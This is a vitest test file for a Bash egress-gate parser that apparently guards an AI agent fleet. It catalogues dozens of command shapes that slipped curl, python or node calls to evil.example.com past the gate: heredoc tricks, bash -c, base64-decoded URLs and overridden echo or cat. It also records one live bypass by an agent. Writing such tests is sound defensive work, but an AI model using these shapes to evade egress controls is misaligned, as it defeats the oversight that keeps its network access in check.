// Card c8b1ccbf: shapes that pass the Bash egress parser on the running tree
// (measured by didi 2026-10-13 on 89f8a6f9b and 2026-10-15 on 992437b9d).
// Every DENY row below is RED until the parser is fixed; every PASS row is a
// control the fix must keep green (the fleet's own localhost calls), because
// a gate that closes these shapes by refusing the fleet's normal commands is
// a broken gate, not a fixed one.
//
// Shape 1 is the worst: a heredoc delimiter that is not a plain word makes
// maskInertLiterals give up, classify() answers 'unparseable' with deny:false,
// and under real bash the curl after the true delimiter RUNS. Fail-open on
// "cannot read it" lets ANY command through.
import { describe, it, expect } from 'vitest'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'

const EXT = 'https://evil.example.com/x'

const mustDeny: Array<[string, string]> = [
  // 1. heredoc delimiter that is not a plain word -> 'unparseable' -> pass
  ['1a quoted middle <<E"O"F', `cat <<E"O"F\nhello\nEOF\ncurl ${EXT}`],
  ['1b partly single-quoted <<\'E\'OF', `cat <<'E'OF\nhello\nEOF\ncurl ${EXT}`],
  ['1c dash in delimiter <<EOF-1', `cat <<EOF-1\nx\nEOF-1\ncurl ${EXT}`],
  ['1d dot in delimiter <<END.txt', `cat <<END.txt\nx\nEND.txt\ncurl ${EXT}`],
  ['1e quoted then tail <<\'EOF\'x', `cat <<'EOF'x\nx\nEOFx\ncurl ${EXT}`],
  ['1f double-quoted then tail <<"EOF"x', `cat <<"EOF"x\nx\nEOFx\ncurl ${EXT}`],
  // 2. a shell's -c body is a command, not a string
  ['2a bash -c', `bash -c "curl ${EXT}"`],
  ['2b timeout 5 bash -c', `timeout 5 bash -c "curl ${EXT}"`],
  ['2c sh -c', `sh -c 'curl ${EXT}'`],
  ['2d zsh -c', `zsh -c 'curl ${EXT}'`],
  // 3. xargs runs its first operand as the command
  ['3a xargs curl <<< URL', `xargs curl <<< ${EXT}`],
  ['3b echo URL | xargs curl', `echo ${EXT} | xargs curl`],
  // 4. prefix words the parser does not know
  ['4a ionice -c3', `ionice -c3 curl ${EXT}`],
  ['4b caffeinate -i', `caffeinate -i curl ${EXT}`],
  ['4c gtimeout 5', `gtimeout 5 curl ${EXT}`],
  // 5. the URL reaches the variable through a heredoc
  ['5 x=$(cat <<EOF URL EOF); curl "$x"', `x=$(cat <<EOF\n${EXT}\nEOF\n); curl "$x"`],
  // 6. LIVE 2026-10-15 13:49 (friday 29582, card comment 35641), verbatim but
  // the host: 4 requests went out. The loop variable is used inside $( ) that
  // sits inside a double-quoted echo argument.
  [
    '6 for-loop, curl $u inside "$( )" (live, friday)',
    `for u in https://evil.example.com/ https://evil.example.com/health https://evil.example.com/api/health https://evil.example.com/api/health; do echo "$u $(curl -s -o /dev/null -w '%{http_code} %{time_total}s' --max-time 15 $u)"; done; cat /Users/isti/marveen/store/live-close-proposals-heartbeat.json; tail -5 /Users/isti/marveen/store/live-close-proposals.log 2>/dev/null`,
  ],
  ['6b for-loop, curl $u inside bare $( )', `for u in ${EXT} ${EXT}2; do echo $(curl -s $u); done`],
]

// Already denied today. Kept here so the shape-6 gap is visibly the
// COMBINATION (loop variable + substitution), not either part alone.
const alreadyDenied: Array<[string, string]> = [
  ['for-loop, curl $u directly after do', `for u in ${EXT} ${EXT}2; do curl -s $u; done`],
  ['"$(curl literal URL)"', `echo "$(curl -s ${EXT})"`],
  ['plain external curl', `curl ${EXT}`],
]

// The fleet's own calls: must stay allowed after the fix.
const L = 'http://localhost:3420/api/kanban'
const mustPass: Array<[string, string]> = [
  ['plain localhost curl', `curl -s ${L}`],
  ['bash -c localhost curl', `bash -c "curl -s ${L}"`],
  ['timeout 5 bash -c localhost curl', `timeout 5 bash -c "curl -s ${L}"`],
  ['ionice localhost curl', `ionice -c3 curl -s ${L}`],
  ['for-loop over localhost URLs, "$( )" form', `for u in ${L} http://localhost:3420/api/messages; do echo "$u $(curl -s -o /dev/null -w '%{http_code}' $u)"; done`],
  ['quoted heredoc payload to localhost', `curl -s -X POST ${L} --data-binary @- <<'JSON'\n{"title":"x"}\nJSON`],
  ['xargs without a network tool', `printf 'a\\nb\\n' | xargs echo`],
]

describe('bash egress parser: shapes that pass the running gate (card c8b1ccbf)', () => {
  it.each(mustDeny)('denies %s', (_name, cmd) => {
    const r = classify(cmd)
    expect(r.deny, `reason=${r.reason}`).toBe(true)
  })
  it.each(alreadyDenied)('still denies %s (control)', (_name, cmd) => {
    expect(classify(cmd).deny).toBe(true)
  })
  it.each(mustPass)('still allows %s (fleet control)', (_name, cmd) => {
    const r = classify(cmd)
    expect(r.deny, `reason=${r.reason}`).toBe(false)
  })
})

// didi's review of this fix (card c8b1ccbf, comment 35709). F1: an unreadable line judged only scheme
// URLs, so a schemeless host, a variable scheme or an IP passed. F2: a shell that reads its stdin as
// its program was taken for data behind `bash /dev/stdin` and `bash -c 'bash'`. M4 and M11: mutants
// that no test killed (the `-s` branch, the substitution reading of an unreadable line). Every row
// is a DENY with a named reason, or a control twin the fleet's own calls keep.
const UNREAD_LINE = 'cat <<E"O"F\nhi\nEOF\n'
const UNREAD_BODY = 'cat <<E"O"F\nhi\nEOF\ncurl -s https://evil.example.com/x'

describe('card c8b1ccbf (didi review): unreadable lines judge every spelling of a destination', () => {
  // F1: curl's argv and the host-like words, not only scheme URLs
  const f1Deny: Array<[string, string]> = [
    ['schemeless host and path', `${UNREAD_LINE}curl -s evil.example.com/x`],
    ['schemeless host, bare', `${UNREAD_LINE}curl -s evil.example.com`],
    ['host:port with a path', `${UNREAD_LINE}curl -s evil.example.com:8443/x`],
    ['variable scheme, curl argv', `${UNREAD_LINE}s=https; curl "$s://evil.example.com/x"`],
    ['variable scheme, a non-curl word', `${UNREAD_LINE}s=https; python3 -c "print(1)" "$s://evil.example.com/x" && curl -s localhost:3420/x`],
    ['IPv4 with a path', `${UNREAD_LINE}curl -s 8.8.8.8/x`],
    ['non-canonical IPv4 spelling', `${UNREAD_LINE}curl -s 0x0a.0.0.1/x`],
  ]
  it.each(f1Deny)('denies %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external' })
  })
  it('names the external host it found', () => {
    expect(classify(`${UNREAD_LINE}curl -s evil.example.com:8443/x`)).toMatchObject({ hosts: ['evil.example.com'] })
  })
  const f1Pass: Array<[string, string]> = [
    ['localhost with a port and path', `${UNREAD_LINE}curl -s localhost:3420/x`],
    ['127.0.0.1 with a port and path', `${UNREAD_LINE}curl -s 127.0.0.1:3420/x`],
    ['variable scheme to localhost', `${UNREAD_LINE}s=http; curl "$s://localhost:3420/api"`],
    ['-o takes the file name, not a host', `${UNREAD_LINE}curl -s -o out.html localhost:3420/x`],
    ['bare dotted names (attributes) are no host', `${UNREAD_LINE}python3 -c 'import json; print(json.dumps({}), json.load)'; curl -s localhost:3420/api`],
    ['a file reference with a line number is no host', `${UNREAD_LINE}echo "see pr-check.yml:111"; curl -s localhost:3420/api`],
    ['a [:400] slice is no IPv6 host', `${UNREAD_LINE}echo "[:400]"; curl -s localhost:3420/api`],
  ]
  it.each(f1Pass)('control: allows %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false, reason: 'unparseable' })
  })

  // M11: a substitution inside an unreadable line is judged by the readable reading of its command
  it('a network command in a substitution of an unreadable line is judged as a command (M11)', () => {
    expect(classify(`${UNREAD_LINE}echo "$(curl -s evil.example.com/x)"`)).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
    expect(classify(`${UNREAD_LINE}s=https; echo "$(curl "$s://evil.example.com/x")"`)).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
    expect(classify(`${UNREAD_LINE}echo "$(curl -s localhost:3420/x)"`).deny).toBe(false)
  })

  // F2: a shell that reads its stdin as its program judges an unreadable body as a program
  const readsStdin = [
    'bash /dev/stdin', 'bash /dev/fd/0', "bash -c 'bash'", "bash -c 'sh -s'", "bash -c 'exec bash'", "bash -c 'cat | bash'",
  ]
  it.each(readsStdin)('F2: an unreadable body fed to %s is a program and denies', (shell) => {
    expect(classify(`${shell} <<'OUT'\n${UNREAD_BODY}\nOUT`), shell).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
  })

  // M4: the `-s` branch of the stdin reading (an unreadable body, so the data exception is what decides)
  it.each(['bash -s x', 'bash -es x', 'sh -s -- a b'])('M4: %s reads the body as its program and denies', (shell) => {
    expect(classify(`${shell} <<'OUT'\n${UNREAD_BODY}\nOUT`), shell).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
  })

  // controls: data stays data, the fleet's localhost body stays allowed
  it.each([
    ["bash -c 'cat' is data", `bash -c 'cat' <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['bash x.sh - is data', `bash x.sh - <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['bash /dev/stdin with a localhost body', `bash /dev/stdin <<'OUT'\n${UNREAD_LINE}curl -s http://localhost:3420/api\nOUT`],
  ])('control: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
})

// didi's third review (card c8b1ccbf, 2026-10-15 17:20). F3: a curl destination built by a substitution
// passed on a READABLE line, live (`curl -s "$(echo evil.example.com/x)"`). F1 residual: an unreadable
// line's `h=host; curl $h` passed. F2 class: a body reaches a program through more doors than the named
// ones, so the data exception now needs POSITIVE evidence of data. Low: the mutants nothing killed.
describe('card c8b1ccbf (didi review 3): substitutions, variables and stdin programs', () => {
  const f3Deny: Array<[string, string]> = [
    ['schemeless URL from echo', 'curl -s "$(echo evil.example.com/x)"'],
    ['scheme URL from echo', 'curl -s "$(echo http://evil.example.com/x)"'],
    ['URL glued by printf', `curl -s "$(printf 'ht%sps://evil.example.com/x' t)"`],
    ['bare host, unquoted substitution', 'curl -s $(echo evil.example.com)'],
    ['backtick', 'curl -s `echo evil.example.com/x`'],
    ['host from a substitution, path literal', 'curl -s "$(echo evil.example.com)/x"'],
    ['variable assigned from a substitution', 'h=$(echo evil.example.com); curl -s "$h/x"'],
    ['proxy value from a substitution', 'curl -s -x "$(echo evil.example.com:3128)" http://localhost:3420/x'],
    ['the substitution reads an assigned variable', 'd=evil.example.com; curl -s "$(echo $d)"'],
  ]
  it.each(f3Deny)('F3: denies a curl destination built by a substitution: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
  })
  it('F3: a substitution in the host that names no host at all is a destination nobody can read: deny', () => {
    expect(classify('curl -s "$(cat target)"')).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['$(cat target)'] })
  })
  const f3Pass: Array<[string, string]> = [
    ['localhost URL from echo', 'curl -s "$(echo http://localhost:3420/x)"'],
    ['substitution in the path of a localhost URL', 'curl -s "http://localhost:3420/api/kanban/$(cat id)/comments"'],
    ['token header from a substitution', 'curl -s -H "Authorization: Bearer $(cat /Users/isti/marveen/store/.dashboard-token)" http://localhost:3420/x'],
    ['JSON body from a substitution', 'curl -s -X POST http://localhost:3420/x -d "$(cat body.json)"'],
  ]
  it.each(f3Pass)('F3 control: allows %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })

  it.each([
    ['h=host; curl $h', `${UNREAD_LINE}h=evil.example.com; curl -s $h`],
    ['h=host; curl "$h"', `${UNREAD_LINE}h=evil.example.com; curl -s "$h"`],
    ['export h=host', `${UNREAD_LINE}export h=evil.example.com; curl -s "$h/x"`],
    ['substitution as the destination', `${UNREAD_LINE}curl -s "$(echo evil.example.com)"`],
  ])('F1 residual: an unreadable line denies %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external', hosts: ['evil.example.com'] })
  })
  it('F1 residual control: an unreadable line with h=localhost stays allowed', () => {
    expect(classify(`${UNREAD_LINE}h=localhost:3420; curl -s "$h/api"`)).toMatchObject({ deny: false, reason: 'unparseable' })
  })

  const f2Program: Array<[string, string]> = [
    ["bash -c 'source /dev/stdin'", `bash -c 'source /dev/stdin' <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ["bash -c '. /dev/stdin'", `bash -c '. /dev/stdin' <<'OUT'\n${UNREAD_BODY}\nOUT`],
    [`bash -c 'eval "$(cat)"'`, `bash -c 'eval "$(cat)"' <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['source /dev/stdin', `source /dev/stdin <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['. /dev/stdin', `. /dev/stdin <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['eval "$(cat)"', `eval "$(cat)" <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['{ bash; }', `{ bash; } <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['cat | bash', `cat <<'OUT' | bash\n${UNREAD_BODY}\nOUT`],
    ['base64 -d | sh', `base64 -d <<'OUT' | sh\n${UNREAD_BODY}\nOUT`],
  ]
  it.each(f2Program)('F2: an unreadable body reaching a program through %s denies', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'heredoc-unparseable-external' })
  })
  it("F2: a shell -c that hands its stdin to an interpreter judges the body as that interpreter's program", () => {
    const cmd = `bash -c 'python3 -' <<'PY'\nimport urllib.request as u; u.urlopen('https://evil.example.com/x')\nPY`
    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'heredoc-external', hosts: ['evil.example.com'] })
  })
  const f2Data: Array<[string, string]> = [
    ["bash -c 'bash ./x.sh -' (a script operand)", `bash -c 'bash ./x.sh -' <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ["bash -c 'echo bash' (text only)", `bash -c 'echo bash' <<'OUT'\n${UNREAD_BODY}\nOUT`],
    ['cat | bash x.sh (a script operand)', `cat <<'OUT' | bash x.sh\n${UNREAD_BODY}\nOUT`],
    ['agent-msg.sh message', `bash /Users/isti/marveen/scripts/agent-msg.sh a b - <<'VEGE'\n${UNREAD_BODY}\nVEGE`],
    ['gh comment body that mentions a curl', `gh pr comment 1 --body-file - <<'EOF'\nIt doesn't pass now: curl https://evil.example.com/x\nEOF`],
    ['commit message that mentions a curl', `git commit -F - <<'EOF'\nfix: don't let curl https://evil.example.com/x through\nEOF`],
    ['a shell elsewhere on the line runs a script, not the body', `gh pr comment 1 --body-file - <<'EOF' && bash scripts/x.sh\nIt doesn't: curl https://evil.example.com/x\nEOF`],
  ]
  it.each(f2Data)('F2 control: %s stays data', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })

  // N1/N2/N7/N8: the host-like word reading of an unreadable line, for a tool that is not curl
  it.each([
    ['an IPv4 without a path', `'http://' + '8.8.8.8'`, '8.8.8.8'],
    ['a bracketed IPv6', `'http://' + '[2001:db8::1]/x'`, '[2001:db8::1]'],
    ['userinfo before the host', `'http://' + 'u:p@evil.example.com/x'`, 'evil.example.com'],
    ['a port after the host', `'http://' + 'evil.example.com:8443/x'`, 'evil.example.com'],
  ])('unreadable line, python destination glued from parts: %s', (_name, expr, host) => {
    const cmd = `${UNREAD_LINE}python3 -c "import urllib.request as u; u.urlopen(${expr})"`
    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external', hosts: [host] })
  })
  it.each([
    ['-d @file is a file, not a host', `${UNREAD_LINE}curl -s -d @data.v2/body.json localhost:3420/x`],
    ['-o takes a dotted directory', `${UNREAD_LINE}curl -s http://localhost:3420/x -o out.dir/file.json`],
  ])('unreadable line control: %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false, reason: 'unparseable' })
  })
})

// didi round 4 (card c8b1ccbf comment 35804, on dec5b0dfc): items 1-3 passed live shapes, item 4 asks
// for tests pinning two denials that already held (O9, O16).
describe('c8b1ccbf round 4', () => {
  const UL = 'cat <<E"O"F\nhi\nEOF\n'
  const UB = `${UL}curl -s ${EXT}`
  const B64 = 'aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g='
  const deny: Array<[string, string]> = [
    // 1. a substitution that names a local host but prints something else
    ['1 decoy, readable', `curl -s "$(echo localhost >/dev/null; echo ${B64} | base64 -d)"`],
    ['1 decoy, unreadable', `${UL}curl -s "$(echo localhost >/dev/null; echo ${B64} | base64 -d)"`],
    ['1 colon decoy, readable', `curl -s "$(: 127.0.0.1; echo x)"`],
    ['1 colon decoy, unreadable', `${UL}curl -s "$(: 127.0.0.1; echo x)"`],
    ['1 cat heredoc that expands', 'curl -s "$(cat <<EOF\nhttp://localhost:3420$(echo x)\nEOF\n)"'],
    // 2. a heredoc / here-string that reaches a program the parser did not see
    ['2a ( bash ) <<S', `( bash ) <<'S'\n${UB}\nS`],
    ['2b source -- /dev/stdin', `source -- /dev/stdin <<'S'\n${UB}\nS`],
    ['2b . -- /dev/stdin', `. -- /dev/stdin <<'S'\n${UB}\nS`],
    ['2c cat |& bash', `cat <<'S' |& bash\n${UB}\nS`],
    ['2d xargs -0 bash -c', `cat <<'S' | xargs -0 bash -c\n${UB}\nS`],
    ['2e bash <<< "$(cat <<S)"', `bash <<< "$(cat <<'S'\n${UB}\nS\n)"`],
    ['2f cat | python3 -', `cat <<'S' | python3 -\nimport urllib.request as u; u.urlopen('${EXT}')\nS`],
    // 3. a variable's value the parser did not read
    ['3a ${h:-host}', 'curl -s ${h:-evil.example.com}'],
    ['3b printf -v', 'printf -v h %s evil.example.com; curl -s $h'],
    ['3c for, unreadable', `${UL}for h in evil.example.com; do curl -s $h; done`],
    ['3c read <<<, unreadable', `${UL}read h <<< evil.example.com; curl -s $h`],
    ['3c printf -v, unreadable', `${UL}printf -v h %s evil.example.com; curl -s $h`],
    // 4. already denied on dec5b0dfc, pinned here
    ['O9 bash -c echo "$(bash)"', `bash -c 'echo "$(bash)"' <<'S'\n${UB}\nS`],
    ['O16 | bash 2>/dev/null', `cat <<'S' | bash 2>/dev/null\n${UB}\nS`],
    ['O16 | bash > out.log', `cat <<'S' | bash > out.log\n${UB}\nS`],
  ]
  it.each(deny)('denies %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true })
  })
  const pass: Array<[string, string]> = [
    ['a substitution that prints a local URL', 'curl -s "$(echo http://localhost:3420)/api/x"'],
    ['printf of a local URL', 'curl -s "$(printf %s http://localhost:3420)/api/x"'],
    ['the dashboard token header', 'curl -s -H "Authorization: Bearer $(cat /Users/isti/marveen/store/.dashboard-token)" http://localhost:3420/api/kanban'],
    ['a substitution in the path', 'curl -s "http://localhost:3420/api/kanban/$(echo abc)/comments"'],
    ['a substitution in the body', 'curl -s -X POST http://localhost:3420/api/x -d "$(cat /tmp/x.json)"'],
    ['${h:-local}', 'curl -s ${h:-http://localhost:3420}/api/x'],
    ['cat | python3 x.py (judged by the python rule since round 5: no network in it)', `cat <<'S' | python3 x.py\n${UB}\nS`],
    ['shell text piped into python3 - (the python rule: no network in it)', `cat <<'S' | python3 -\n${UB}\nS`],
    ['bash <<< "$(cat x.sh)" (no host)', 'bash <<< "$(cat x.sh)"'],
  ]
  it.each(pass)('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
})

// didi round 5 (card c8b1ccbf, on 897454ee6): item 1, a line that redefines echo / printf / cat makes
// a "literal print" substitution run anything; items 2-3, an interpreter reached through a pipe kept
// its stdin as data when an option took a value (-W ignore, -X utf8, node's -r) or xargs fed the code.
describe('c8b1ccbf round 5', () => {
  const UL = 'cat <<E"O"F\nhi\nEOF\n'
  const B64 = 'aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g='
  const PY = `import urllib.request as u; u.urlopen('${EXT}')`
  const UB = `curl -s ${EXT}`
  const deny: Array<[string, string]> = [
    ['1 echo() override, readable', `echo(){ base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`],
    ['1 echo() override, unreadable', `${UL}echo(){ base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`],
    ['1 function printf, readable', `function printf { base64 -d <<< ${B64}; }; curl -s "$(printf %s localhost)"`],
    ['1 function printf, unreadable', `${UL}function printf { base64 -d <<< ${B64}; }; curl -s "$(printf %s localhost)"`],
    ['1 cat() + quoted heredoc', `cat(){ base64 -d <<< ${B64}; }; curl -s "$(cat <<'S'\nlocalhost\nS\n)"`],
    ['1 zsh two-name definition', `echo printf () { base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`],
    ['1 override seen inside a substitution', `echo(){ base64 -d <<< ${B64}; }; x=$(curl -s "$(echo localhost)")`],
    ['1 alias', `alias echo='base64 -d <<< ${B64} #'; curl -s "$(echo localhost)"`],
    ['1 export -f into a text-only -c body', `echo(){ eval "$(cat)"; }; export -f echo; bash -c echo <<'S'\n${UB}\nS`],
    ['2 | python3 -W ignore -', `cat <<'S' | python3 -W ignore -\n${PY}\nS`],
    ['2 | python3 -X utf8 -', `cat <<'S' | python3 -X utf8 -\n${PY}\nS`],
    ['2 | node -r ./x.js', `cat <<'S' | node -r ./x.js\nfetch('${EXT}')\nS`],
    ['2 bash -c python3 -W ignore -', `bash -c 'python3 -W ignore -' <<'S'\n${PY}\nS`],
    ['3 | xargs -0 -I{} python3 -c {}', `cat <<'S' | xargs -0 -I{} python3 -c {}\n${PY}\nS`],
  ]
  it.each(deny)('denies %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: true })
  })
  const pass: Array<[string, string]> = [
    ['echo of localhost, no definition', 'curl -s "$(echo localhost)/api/x"'],
    ['printf of 127.0.0.1, no definition', 'curl -s "$(printf %s http://127.0.0.1:3420)/api/x"'],
    ['quoted cat heredoc of localhost', `curl -s "$(cat <<'S'\nlocalhost\nS\n)/api/x"`],
    ['a function that is not a printer, local curl', 'f(){ echo hi; }; f; curl -s http://localhost:3420/api/x'],
    ['python3 -c reading stdin as data (no network in the code)', `cat <<'S' | python3 -c 'import sys; print(sys.stdin.read())'\n${PY}\nS`],
    ['agent-msg.sh message naming a link', `bash /Users/isti/marveen/scripts/agent-msg.sh dexter marveen - <<'VEGE'\nsee ${EXT} and urllib\nVEGE`],
  ]
  it.each(pass)('passes %s', (_name, cmd) => {
    expect(classify(cmd), cmd).toMatchObject({ deny: false })
  })
})
